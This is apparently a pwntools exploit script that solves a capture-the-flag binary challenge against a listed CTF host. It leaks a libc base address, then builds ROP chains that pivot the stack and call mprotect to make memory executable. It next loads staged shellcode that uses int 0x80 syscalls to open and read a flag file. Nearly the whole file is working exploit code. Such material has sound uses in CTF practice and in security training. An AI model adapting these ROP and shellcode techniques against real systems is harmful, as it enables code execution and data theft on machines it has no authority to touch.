#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("setup_patched")
libc = ELF("./libc-2.34.so")
ld = ELF("./ld-2.34.so")

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "challs.ctf.sekai.team", "4002"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

sla('> ', '1')
sa('to: ', 'A'*0x08)

sla('> ', '1')
libc.address = u64(rcu('A'*0x8, '\x1b\x5b\x30').ljust(8,b'\x00')) - 0xed957 # - 0x22aacd
print('libc base = '+hex(libc.address))

#pause()

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

pop_rsp = libc.address + 0x0000000000039762 # pop rsp ; ret
leave = libc.address + 0x000000000005a1ac # leave ; ret
xor_edi_edi_syscall = libc.address + 0x000000000011d3a0 # xor edi, edi; syscall; cmp rax, -0x1000; ja 0x11d3b0; ret;

buff = (libc.address - 0x3000)

#Â to reach ourserve on stack, then download shellcode that will be put in tls-storage at libc.base - 0x3000 (rwx zone now)
payload2 = p64(ret)*(0x21e0>>3)
payload2 += p64(pop_rdi)+p64(buff)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)+p64(7)+p64(libc.sym['mprotect'])+p64(pop_rdi)+p64(buff)+p64(libc.sym['gets'])+p64(buff)

# pivot on second rop
payload = p64(libc.address - 0x2898)+'A'*0x50 + p64(buff)
payload += p64(pop_rdx)+p64(len(payload2))+p64(xor_edi_edi_syscall)

print('payload size = '+str(len(payload)))
print(hexdump(payload))

sa('\x3a\x20\x1b\x5b\x30\x6d\x1b\x5b\x30\x3b\x33\x36\x6d', payload)

sa('Data: ', 'A'*8)

p.send(payload2)


shellcode = asm('''
// int 3
mov rax,0xc0
mov rbx,0x40000
mov rcx,0x1000
mov rdx,7
mov rsi,34
mov rdi,0
int 0x80

mov rcx,%s
mov rdi,rax
call rcx

// open
mov rax,5
mov rbx,0x40000
mov rcx,0
int 0x80

// read
mov rdi,rax
mov rsi,0x40000
mov rdx,128
xor eax,eax
syscall

// write
mov rdx,rax
mov rdi,1
mov eax,1
syscall

''' % (libc.sym['gets']) )

sl(shellcode)

# send shellcode the filename to read
if args.REMOTE:
  sl('/home/user/85c6ead8489c814ccc024c7054edf8e4.txt\x00')
else:
  sl('./flag.txt')

p.interactive()

